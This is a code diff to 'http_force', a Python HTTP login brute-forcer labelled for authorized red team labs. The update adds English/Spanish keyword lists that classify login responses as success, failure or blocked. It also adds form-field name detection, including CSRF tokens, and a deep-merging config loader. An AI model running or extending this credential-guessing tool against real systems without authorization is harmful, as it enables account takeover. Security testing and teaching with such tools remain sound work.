@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-http_force v3.2
+http_force v3.3
 HTTP login form brute-forcer for authorized red team lab use.
 
 Usage:
@@ -126,6 +126,78 @@ DEFAULT_CONFIG = {
     "rate_limit_detection": True,
     "consecutive_errors_threshold": 5,
     "throttle_backoff_multiplier": 2.0,
+
+    # Keywords used to score responses. Config values EXTEND (not replace) the
+    # built-in regex patterns, so you only need to add terms not already covered.
+    "success_keywords": [
+        "dashboard", "logout", "log out", "sign out", "bienvenido", "bienvenida",
+        "welcome", "welcome back", "profile", "perfil", "mi cuenta", "my account",
+        "admin panel", "panel de control", "administration", "administración",
+        "sesión iniciada", "logged in", "signed in", "login successful",
+        "successfully logged", "authentication successful", "autenticación exitosa",
+        "access granted", "home", "inicio", "settings", "configuración",
+        "preferences", "preferencias", "notifications", "notificaciones",
+        "inbox", "messages", "mensajes", "bandeja de entrada",
+        "success", "successful", "exitoso", "exitosa",
+    ],
+    "fail_keywords": [
+        "invalid", "inválido", "error", "incorrect", "incorrecto", "wrong",
+        "try again", "intenta de nuevo", "intente nuevamente", "falló", "fallo",
+        "failed", "failure", "unauthorized", "no autorizado", "denied", "denegado",
+        "access denied", "acceso denegado", "authentication failed",
+        "autenticación fallida", "login failed", "inicio de sesión fallido",
+        "invalid username", "usuario inválido", "invalid password",
+        "contraseña inválida", "invalid credentials", "credenciales inválidas",
+        "wrong username", "usuario incorrecto", "wrong password",
+        "contraseña incorrecta", "incorrect username", "incorrect password",
+        "bad credentials", "malas credenciales", "authentication error",
+        "login error", "could not authenticate", "no se pudo autenticar",
+        "account not found", "cuenta no encontrada", "user not found",
+        "usuario no encontrado", "does not exist", "no existe",
+        "invalid combination", "combinación inválida", "forbidden", "prohibido",
+        "not allowed", "no permitido",
+    ],
+    "block_keywords": [
+        "rate limit", "rate-limit", "ratelimit", "too many", "too many attempts",
+        "too many requests", "demasiados intentos", "blocked", "bloqueado",
+        "banned", "baneado", "captcha", "recaptcha", "hcaptcha",
+        "temporarily locked", "temporalmente bloqueado", "account locked",
+        "cuenta bloqueada", "ip locked", "abuse", "abuso",
+        "suspicious activity", "actividad sospechosa", "rate exceeded",
+        "límite excedido", "throttled", "slow down", "please wait",
+        "por favor espera", "try again later", "intenta más tarde",
+    ],
+
+    # Field name matching for form detection.
+    # These lists EXTEND the built-in regex — add custom field names here.
+    "user_field_names": [
+        "username", "user", "usuario", "email", "e-mail", "correo",
+        "login", "user_name", "user-name", "userid", "user_id", "user-id",
+        "login_name", "login-name", "loginname", "account", "cuenta",
+        "account_name", "accountname", "nombre", "name", "uname",
+        "uid", "identifier", "identificador",
+    ],
+    "pass_field_names": [
+        "password", "pass", "pwd", "passwd", "passcode", "pass_code",
+        "pass-code", "contraseña", "contrasena", "clave", "secret", "pin",
+        "password1", "password_1", "user_password", "userpassword",
+        "user-password", "login_password", "loginpassword", "login-password",
+    ],
+    "csrf_field_names": [
+        "csrf_token", "csrf-token", "_token", "authenticity_token",
+        "__requestverificationtoken", "nonce", "_wpnonce", "form_token",
+        "form-token", "csrfmiddlewaretoken", "xsrf_token", "xsrf-token",
+        "_csrf", "anti_csrf", "request_token",
+    ],
+
+    # URL path fragments that indicate a successful post-login redirect.
+    # These EXTEND the built-in list.
+    "authenticated_paths": [
+        "dashboard", "admin", "panel", "home", "account", "profile",
+        "portal", "welcome", "inicio", "mi-cuenta", "perfil",
+        "control", "manage", "overview", "console", "workspace",
+    ],
+
     "score_thresholds": {
         "status_change": 2,
         "length_change": 2,
@@ -375,14 +447,31 @@ def setup_logger(name: str, level: LogLevel = LogLevel.INFO,
 
 
 def load_config(config_path: Optional[Path] = None) -> Dict[str, Any]:
-    """Returns DEFAULT_CONFIG merged with an optional JSON override file."""
-    config = DEFAULT_CONFIG.copy()
+    """
+    Returns DEFAULT_CONFIG merged with an optional JSON override file.
+    Nested dicts (e.g. score_thresholds) are merged key-by-key so you only
+    need to specify the keys you want to change, not the entire sub-object.
+    Keys starting with '_' are ignored (treated as comments/docs).
+    """
+    import copy
+    config = copy.deepcopy(DEFAULT_CONFIG)
+
     if config_path and config_path.exists():
         try:
             with open(config_path, 'r', encoding='utf-8') as f:
-                config.update(json.load(f))
+                custom = json.load(f)
+
+            for key, value in custom.items():
+                if key.startswith('_'):
+                    continue  # skip comment/doc keys
+                if isinstance(value, dict) and isinstance(config.get(key), dict):
+                    config[key].update(value)  # deep merge for nested dicts
+                else:
+                    config[key] = value
+
         except Exception as e:
             print(f"[!] Error loading config: {e}. Using defaults.")
+
     return config
 
 
@@ -476,11 +565,23 @@ class CredentialLoader:
 
 
 class FormAnalyzer:
-    """Parses HTML pages to locate and extract login form fields."""
+    """
+    Parses HTML pages to locate and extract login form fields.
+
+    Field detection combines pre-compiled regex (RegexPatterns) with the
+    explicit name lists from config (user_field_names, pass_field_names,
+    csrf_field_names).  Config lists take priority for exact matches;
+    regex acts as a catch-all for names not in the lists.
+    """
 
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         self.config = config
         self.logger = logger
+
+        # Build lowercase sets for O(1) exact-match lookup
+        self._user_fields  = {n.lower() for n in config.get('user_field_names', [])}
+        self._pass_fields  = {n.lower() for n in config.get('pass_field_names', [])}
+        self._csrf_fields  = {n.lower() for n in config.get('csrf_field_names', [])}
 
     def find_login_form(self, html: str, base_url: str) -> Optional[FormData]:
         """Returns the first valid login form found in the HTML, or None."""
@@ -494,6 +595,22 @@ class FormAnalyzer:
             self.logger.error(f"Error analizando formulario: {e}")
         return None
 
+    def _is_csrf_field(self, name: str) -> bool:
+        return name.lower() in self._csrf_fields or bool(RegexPatterns.CSRF_FIELD.search(name))
+
+    def _is_password_field(self, name: str, kind: str) -> bool:
+        return (
+            kind == 'password'
+            or name.lower() in self._pass_fields
+            or bool(RegexPatterns.PASSWORD_FIELD.search(name))
+        )
+
+    def _is_username_field(self, name: str) -> bool:
+        return (
+            name.lower() in self._user_fields
+            or bool(RegexPatterns.USERNAME_FIELD.search(name))
+        )
+
     def _analyze_form(self, form, base_url: str) -> Optional[FormData]:
         """Extracts action URL, method, and field names from a single <form> element."""
         try:
@@ -503,21 +620,21 @@ class FormAnalyzer:
             fd = FormData(action_url=action_url, method=method)
 
             for inp in form.find_all('input'):
-                name = inp.get('name', '')
-                kind = inp.get('type', 'text').lower()
+                name  = inp.get('name', '')
+                kind  = inp.get('type', 'text').lower()
                 value = inp.get('value', '')
 
                 if not name:
                     continue
 
-                if RegexPatterns.CSRF_FIELD.search(name):
+                if self._is_csrf_field(name):
                     fd.hidden_fields[name] = value
                     fd.csrf_tokens[name] = value
                     self.logger.debug(f"CSRF token encontrado: {name}")
-                elif kind == 'password' or RegexPatterns.PASSWORD_FIELD.search(name):
+                elif self._is_password_field(name, kind):
                     fd.password_field = name
                     self.logger.debug(f"Campo password encontrado: {name}")
-                elif RegexPatterns.USERNAME_FIELD.search(name):
+                elif self._is_username_field(name):
                     fd.username_field = name
                     self.logger.debug(f"Campo usuario encontrado: {name}")
                 elif kind == 'hidden':
@@ -595,6 +712,11 @@ class ResponseAnalyzer:
     status code change, body length/hash change, new cookies, keyword presence,
     disappearance of the login form, and post-login URL path.
 
+    Keyword patterns are compiled at init time by merging the built-in regex
+    with any extra terms supplied via config (success_keywords, fail_keywords,
+    block_keywords, authenticated_paths).  Config values EXTEND the base
+    patterns — they are not replacements.
+
     Hard gates applied before scoring:
     - HTTP 429  → rate-limit, stop attack
     - HTTP 403/405/406/423/451 → definitive reject, score -50
@@ -605,6 +727,51 @@ class ResponseAnalyzer:
         self.config = config
         self.logger = logger
         self.baseline_response = None
+
+        # Build runtime patterns that merge base regex + config keyword lists
+        self._success_re = self._build_pattern(
+            RegexPatterns.SUCCESS_PATTERN,
+            config.get('success_keywords', []),
+        )
+        self._fail_re = self._build_pattern(
+            RegexPatterns.FAIL_PATTERN,
+            config.get('fail_keywords', []),
+        )
+        self._block_re = self._build_pattern(
+            RegexPatterns.BLOCK_PATTERN,
+            config.get('block_keywords', []),
+        )
+        self._authenticated_path_re = self._build_path_pattern(
+            config.get('authenticated_paths', []),
+        )
+
+    @staticmethod
+    def _build_pattern(base_pattern: re.Pattern, extra_keywords: List[str]) -> re.Pattern:
+        """
+        Returns a new pattern that matches everything the base pattern matches
+        PLUS any extra keywords from the config list.
+        Extra keywords are escaped and joined as literal word alternatives.
+        """
+        if not extra_keywords:
+            return base_pattern
+
+        extras = '|'.join(re.escape(kw) for kw in extra_keywords if kw.strip())
+        combined = f'(?:{base_pattern.pattern})|(?:{extras})'
+        return re.compile(combined, re.IGNORECASE)
+
+    @staticmethod
+    def _build_path_pattern(extra_paths: List[str]) -> re.Pattern:
+        """
+        Builds the authenticated-path regex from the base list + config extras.
+        """
+        base_paths = [
+            'dashboard', 'admin', 'panel', 'home', 'account', 'profile',
+            'portal', 'welcome', 'inicio', 'inicio[-_]sesion',
+            'mi[-_]cuenta', 'perfil',
+        ]
+        all_paths = base_paths + [re.escape(p) for p in extra_paths if p.strip()]
+        pattern = r'/(' + '|'.join(all_paths) + r')'
+        return re.compile(pattern, re.IGNORECASE)
 
     def set_baseline(self, response: requests.Response):
         """Captures the unauthenticated page state for later comparison."""
@@ -629,7 +796,7 @@ class ResponseAnalyzer:
 
     def _check_redirect_success(self, response: requests.Response) -> bool:
         """Returns True if the final URL after redirects looks like an authenticated area."""
-        return bool(RegexPatterns.AUTHENTICATED_PATH.search(response.url))
+        return bool(self._authenticated_path_re.search(response.url))
 
     def analyze_response(self, response: requests.Response,
                          elapsed: float) -> Tuple[int, bool, bool]:
@@ -653,8 +820,8 @@ class ResponseAnalyzer:
             self.logger.debug(f"HTTP {status} → error de servidor")
             return -10, False, False
 
-        if RegexPatterns.BLOCK_PATTERN.search(text):
-            kw = RegexPatterns.BLOCK_PATTERN.search(text).group(0)
+        if self._block_re.search(text):
+            kw = self._block_re.search(text).group(0)
             self.logger.warning(f"[!] BLOQUEO DETECTADO: '{kw}'")
             return -100, True, False
 
@@ -685,13 +852,15 @@ class ResponseAnalyzer:
             elif has_form_now:
                 score += th['login_form_present']
 
-        success_hits = RegexPatterns.SUCCESS_PATTERN.findall(text)
+        success_hits = self._success_re.findall(text)
         if success_hits:
             score += th['success_keywords'] * len(success_hits)
+            self.logger.debug(f"Keywords éxito: {success_hits[:5]}")
 
-        fail_hits = RegexPatterns.FAIL_PATTERN.findall(text)
+        fail_hits = self._fail_re.findall(text)
         if fail_hits:
             score += th['fail_keywords'] * len(fail_hits)
+            self.logger.debug(f"Keywords fallo: {fail_hits[:5]}")
 
         if self._check_redirect_success(response):
             score += 3
@@ -1148,7 +1317,7 @@ def main():
     logger = setup_logger('http_force', log_level, args.log)
 
     logger.info("=" * 60)
-    logger.info(" http_force v3.2")
+    logger.info(" http_force v3.3")
     logger.info(" Authorized lab use only")
     logger.info("=" * 60)
 
